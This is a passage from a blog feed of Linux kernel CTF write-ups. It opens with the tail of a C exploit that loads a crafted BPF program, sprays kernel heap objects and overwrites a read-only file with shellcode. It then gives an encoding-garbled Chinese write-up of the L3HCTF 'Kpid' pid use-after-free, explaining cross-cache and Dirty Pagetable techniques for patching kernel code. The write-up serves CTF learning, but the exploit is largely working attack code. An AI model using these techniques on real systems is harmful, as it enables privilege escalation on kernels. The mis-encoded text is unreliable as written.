&amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_freeze</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_FREEZE, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_update_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* value)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>                .value = (<span class="hljs-type">uint64_t</span>)value,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_delete_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_get_next_key</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key, <span class="hljs-type">void</span>* next_key)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>                .next_key = (<span class="hljs-type">uint64_t</span>)next_key,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">uint32_t</span><br><span class="hljs-title function_">bpf_map_get_info_by_fd</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_info</span> <span class="hljs-title">info</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .info.bpf_fd = map_fd,<br>                .info.info_len = <span class="hljs-keyword">sizeof</span>(info),<br>                .info.info = (<span class="hljs-type">uint64_t</span>)&amp;info,<br><br>        &#125;;<br>        bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);<br>        <span class="hljs-keyword">return</span> info.btf_id;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">hack_prog</span>[] =</span> &#123;<br>        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),    <span class="hljs-comment">// reg9 = ctx</span><br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),   <span class="hljs-comment">// reg2 = fp</span><br>        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, <span class="hljs-number">-4</span>),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>),  <span class="hljs-comment">// reg2 = fp - 4</span><br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">3</span>*<span class="hljs-number">8</span>+<span class="hljs-number">3</span>),<br><br>        <span class="hljs-comment">// map_lookup_elem(map_fd(x), fp - 4)</span><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),<br><br>        BPF_MOV64_IMM(BPF_REG_1, <span class="hljs-number">2</span>|<span class="hljs-number">0x40000</span>|<span class="hljs-number">0xa801d</span>),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, <span class="hljs-number">0x34</span>),<br>        BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_1, <span class="hljs-number">0</span>),<br><br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br>        BPF_EXIT_INSN(),<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_LOG_SZ 0x20000</span><br><span class="hljs-type">char</span> bpf_log_buf[BPF_LOG_SZ] = &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">hack_attr</span> =</span> &#123;<br>    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,<br>    .insns = (<span class="hljs-type">uint64_t</span>) &amp;hack_prog,<br>    .insn_cnt = <span class="hljs-keyword">sizeof</span>(hack_prog) / <span class="hljs-keyword">sizeof</span>(hack_prog[<span class="hljs-number">0</span>]),<br>    .license = (<span class="hljs-type">uint64_t</span>) <span class="hljs-string">&quot;GPL&quot;</span>,<br>    .log_level = <span class="hljs-number">2</span>,<br>    .log_buf = (<span class="hljs-type">uint64_t</span>) bpf_log_buf,<br>    .log_size = BPF_LOG_SZ,<br>&#125;;<br><br><span class="hljs-type">char</span> buffer[<span class="hljs-number">0x8000</span>] = <span class="hljs-string">&quot;eurus&quot;</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigger</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_tmp)</span> &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">sk_buff</span> <span class="hljs-title">md</span> =</span> &#123;&#125;;<br><br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">test_run_attr</span> =</span> &#123;<br>                .test.prog_fd = fd_tmp,<br>                .test.data_size_in = <span class="hljs-number">0x300</span>,<br>                .test.data_in = (<span class="hljs-type">uint64_t</span>)&amp;buffer,<br>                .test.ctx_size_in = <span class="hljs-keyword">sizeof</span>(md),<br>                .test.ctx_in = (<span class="hljs-type">uint64_t</span>)&amp;md,<br>        &#125;;<br><br>        bpf(BPF_PROG_TEST_RUN, &amp;test_run_attr);<br>&#125;<br><br><br><span class="hljs-type">int</span> file_fds[FILE_SPRAY_N];<br><span class="hljs-type">int</span> map_fds[MAP_SPRAY_N];<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><br>        setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>        setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>        setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br>        <br>        save_status();<br>        bind_core(<span class="hljs-number">0</span>);<br><br>        prctl(PR_SET_NAME, <span class="hljs-string">&quot;Eurus&quot;</span>);<br>        <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buffer));<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">                kmalloc-512</span><br><span class="hljs-comment">                cpu_partial = 52</span><br><span class="hljs-comment">                min_partial = 5</span><br><span class="hljs-comment">                oo = 8</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;MAP_SPRAY_N; i++) &#123;<br>            map_fds[i] = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, <span class="hljs-number">0x200</span><span class="hljs-number">-0x140</span>, <span class="hljs-number">1</span>, BPF_F_WRONLY_PROG);<br>            <span class="hljs-keyword">if</span>(map_fds[i] &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;bpf_map_create&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Spray map over.&quot;</span>);<br><br>        <span class="hljs-type">int</span> bpf_fd = bpf(BPF_PROG_LOAD, &amp;hack_attr);<br>        <span class="hljs-keyword">if</span> (bpf_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;bpf_prog_load&quot;</span>), <span class="hljs-built_in">puts</span>(bpf_log_buf);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;MAP_SPRAY_N; i++) &#123;<br>                close(map_fds[i]);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Release maps over.&quot;</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;FILE_SPRAY_N; i++) &#123;<br>                file_fds[i] = open(<span class="hljs-string">&quot;/bin/busybox&quot;</span>, O_RDONLY);<br>                <span class="hljs-keyword">if</span>(file_fds[i] &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Spray file over.&quot;</span>);<br><br>        trigger(bpf_fd);<br><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> elfcode[] = &#123;<br>                <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0x48</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x48</span>,<br>                <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x02</span>,<br>                <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>,<br>                <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>                <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>,<br>        &#125;;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;FILE_SPRAY_N; i++) &#123;<br>                <span class="hljs-type">int</span> n = write(file_fds[i], elfcode, <span class="hljs-keyword">sizeof</span>(elfcode));<br>                <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Write Success!&quot;</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>kernel</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 L3HCTF Kpid</title>
    <link href="/2025/08/14/kpid/"/>
    <url>/2025/08/14/kpid/</url>
    
    <content type="html"><![CDATA[<p>ç¿»å‡ºä¸€é“å†å²æ‚ ä¹…çš„é¢˜</p><span id="more"></span><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h2 id="ioctlåŠŸèƒ½"><a href="#ioctlåŠŸèƒ½" class="headerlink" title="ioctlåŠŸèƒ½"></a>ioctlåŠŸèƒ½</h2><p>ä¸‰ä¸ªåŠŸèƒ½ï¼š</p><ul><li><p>0x47001ï¼šè°ƒç”¨kernel_cloneï¼Œå¹¶è®°å½•pidç»“æ„ä½“æŒ‡é’ˆpidå’Œpidå·nr</p><ul><li><p>å®é™…ä¸Šå’Œç”¨æˆ·æ€è°ƒç”¨forkæ•ˆæœä¸€æ ·ï¼ˆé©±åŠ¨ä»£ç å¦‚ä¸‹ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">args.exit_signal = <span class="hljs-number">17LL</span>;<br><span class="hljs-built_in">memset</span>(&amp;args.<span class="hljs-built_in">stack</span>, <span class="hljs-number">0</span>, <span class="hljs-number">88</span>);<br><span class="hljs-built_in">memset</span>(&amp;args, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);<br>nr = kernel_clone(&amp;args);<br></code></pre></td></tr></table></figure></li><li><p>forkç³»ç»Ÿè°ƒç”¨å®šä¹‰ï¼ŒSIGCHLDå°±æ˜¯17</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE0(fork)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kernel_clone_args</span> <span class="hljs-title">args</span> =</span> &#123;<br>.exit_signal = SIGCHLD,<span class="hljs-comment">// 17</span><br>&#125;;<br><br><span class="hljs-keyword">return</span> kernel_clone(&amp;args);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>0x58002ï¼šè·å–nrï¼Œä¹Ÿå°±æ˜¯å­è¿›ç¨‹å·ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„</p></li><li><p>0x69003ï¼šè°ƒç”¨äº†put_pidï¼Œä¼šå°†pid-&gt;countä¹Ÿå°±æ˜¯å¼•ç”¨è®¡æ•°å‡ä¸€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">put_pid</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pid *pid)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid_namespace</span> *<span class="hljs-title">ns</span>;</span><br><br><span class="hljs-keyword">if</span> (!pid)<br><span class="hljs-keyword">return</span>;<br><br>ns = pid-&gt;numbers[pid-&gt;level].ns;<br><span class="hljs-keyword">if</span> (refcount_dec_and_test(&amp;pid-&gt;count)) &#123;<br>kmem_cache_free(ns-&gt;pid_cachep, pid);<br>put_pid_ns(ns);<br>&#125;<br>&#125;<br>EXPORT_SYMBOL_GPL(put_pid);<br></code></pre></td></tr></table></figure><p>å‡åˆ°0å°±ä¼šå°†è¿™ä¸ªpidä»å¯¹åº”nsé‡Œåˆ é™¤å¹¶é‡Šæ”¾</p></li></ul><h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>å¯ä»¥é€šè¿‡0x69003åŠŸèƒ½é‡Šæ”¾pidç»“æ„ä½“</p><h1 id="åˆ©ç”¨æ–¹æ³•1"><a href="#åˆ©ç”¨æ–¹æ³•1" class="headerlink" title="åˆ©ç”¨æ–¹æ³•1"></a>åˆ©ç”¨æ–¹æ³•1</h1><h2 id="Cross-Cache-Attack"><a href="#Cross-Cache-Attack" class="headerlink" title="Cross Cache Attack"></a>Cross Cache Attack</h2><p>pidç»“æ„ä½“çš„åˆ†é…é‡Šæ”¾ä½¿ç”¨ä¸“æœ‰cacheï¼Œæ‰€ä»¥éœ€è¦å°†æ”»å‡»ç›®æ ‡ç»“æ„ä½“è½¬æ¢åˆ°å…¶ä»–cache</p><p>slabå†…å­˜ç®¡ç†æ•°æ®ç»“æ„å›¾ï¼š</p><img src="/2025/08/14/kpid/slab.jpg" class title="slab"><p>åˆ†é…é€»è¾‘ï¼š</p><ul><li>èµ°kmem_cache_cpu<ul><li>èµ°freelist</li><li>å½“kmem_cache_cpu-&gt;pageä¸ºç©ºæ—¶ï¼Œéå†kmem_cache_cpu-&gt;partialï¼Œæ‘˜ä¸‹ä¸€ä¸ªslabæ”¾å…¥kmem_cache_cpu-&gt;page</li></ul></li><li>èµ°kmem_cache_node<ul><li>éå†kmem_cache_node-&gt;partialï¼Œæ‘˜ä¸‹æœ€å¤škmem_cache-&gt;cpu_partial &#x2F; 2ä¸ªslabæ”¾å…¥kmem_cache_cpu-&gt;partial</li></ul></li><li>ç”³è¯·æ–°çš„slabï¼Œæ”¾å…¥kmem_cache_cpu-&gt;page</li></ul><img src="/2025/08/14/kpid/alloc.webp" class title="alloc"><p>é‡Šæ”¾é€»è¾‘ï¼š</p><ul><li>å¯¹è±¡å±äºkmem_cache_cpu-&gt;pageï¼Œç›´æ¥æ”¾å›</li><li>å¯¹è±¡å±äºkmem_cache_cpu-&gt;partialï¼Œç›´æ¥æ”¾å›</li><li>å¯¹è±¡ä¸å±äºkmem_cache_cpu-&gt;partialï¼Œä¸”æ‰€å±slabä»fullå˜ä¸ºpartial<ul><li>kmem_cache_cpu-&gt;partialå®¹é‡ä¸è¶…è¿‡kmem_cache-&gt;cpu_partialï¼Œå°†slabæ”¾å…¥kmem_cache_cpu-&gt;partial</li><li>kmem_cache_cpu-&gt;partialå®¹é‡è¶…è¿‡kmem_cache-&gt;cpu_partialï¼Œå°†kmem_cache_cpu-&gt;partialä¸­slabæ”¾å…¥kmem_cache_node-&gt;partialï¼Œå°†slabæ”¾å…¥kmem_cache_cpu-&gt;partial</li></ul></li><li>å¯¹è±¡ä¸å±äºkmem_cache_cpu-&gt;partialï¼Œä¸”æ‰€å±slabä»partialå˜ä¸ºempty<ul><li>kmem_cache_node-&gt;partialå®¹é‡ä¸è¶…è¿‡kmem_cache-&gt;min_partialï¼Œå°†slabæ”¾å…¥kmem_cache_node-&gt;partial</li><li>kmem_cache_node-&gt;partialå®¹é‡è¶…è¿‡kmem_cache-&gt;min_partialï¼Œå°†slabæ”¾å›buddy system</li></ul></li><li>å¯¹è±¡å±äºkmem_cache_node-&gt;partialï¼Œç›´æ¥æ”¾å›</li></ul><img src="/2025/08/14/kpid/free.webp" class title="free"><p>Cross Cache Attackéœ€è¦å°†æ”»å‡»ç›®æ ‡ç»“æ„ä½“æ‰€å±slabæ”¾å›buddy systemï¼Œç­‰å¾…åˆ†é…ç»™å¦ä¸€ä¸ªcacheï¼Œç›¸å½“äºä¸€ä¸ªæ¼æ´çš„è½¬ç§»</p><h2 id="Dirty-Pagetable"><a href="#Dirty-Pagetable" class="headerlink" title="Dirty Pagetable"></a>Dirty Pagetable</h2><p>å¯ä»¥é€šè¿‡å¢åŠ æˆ–å‡å°‘è¿›ç¨‹çš„refcountæ¥æ§åˆ¶pid-&gt;countï¼Œé€‰æ‹©PTEä½œä¸ºæ”»å‡»ç›®æ ‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> &#123;</span><br>    <span class="hljs-type">refcount_t</span>count;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>level;<br>    <span class="hljs-type">spinlock_t</span>lock;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_head</span><span class="hljs-title">tasks</span>[4];</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_head</span><span class="hljs-title">inodes</span>;</span><br>    <span class="hljs-type">wait_queue_head_t</span>wait_pidfd;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">callback_head</span><span class="hljs-title">rcu</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">upid</span><span class="hljs-title">numbers</span>[1];</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¢åŠ PTE 0x1000å¯ä»¥è®©ä¸¤ä¸ªPTEæŒ‡å‘åŒä¸€ä¸ªpageï¼Œé€ æˆUAFã€‚å¯ä»¥é€šè¿‡åˆ¤æ–­é¡µå†…å®¹æ¥æ‰¾dirty page</p><img src="/2025/08/14/kpid/pte.png" class title="pte"><h2 id="åˆ©ç”¨æµç¨‹"><a href="#åˆ©ç”¨æµç¨‹" class="headerlink" title="åˆ©ç”¨æµç¨‹"></a>åˆ©ç”¨æµç¨‹</h2><p>å–·PTEæ¶ˆè€—ä¸€æ³¢pageï¼Œç„¶åç”³è¯·DMA-BUFï¼Œç„¶åå†å–·ä¸€æ³¢PTEï¼Œè¿™æ ·èƒ½ä½¿DMA-BUF pageä¹‹åç›¸é‚»PTE page</p><img src="/2025/08/14/kpid/pte1.png" class title="pte1"><p>å¢åŠ PTE 0x1000ï¼Œé€ UAF page</p><img src="/2025/08/14/kpid/pte2.png" class title="pte2"><p>munmap UAF pageï¼Œå†mmapåˆ°DMA-BUF</p><img src="/2025/08/14/kpid/pte3.png" class title="pte3"><p>å†å¢åŠ PTE 0x1000ï¼Œä½¿dirty PTEæŒ‡å‘å¦ä¸€ä¸ªPTEé¡µ</p><img src="/2025/08/14/kpid/pte4.png" class title="pte4"><p>ç„¶åå°±å¯ä»¥é€šè¿‡UAF pageæ”¹PTEè¡¨äº†ï¼Œ0x9c000æ³„éœ²å†…æ ¸åŠ è½½ç‰©ç†åŸºå€ï¼Œç„¶åæ”¹__sys_setresuidå‡½æ•°å†…å®¹</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 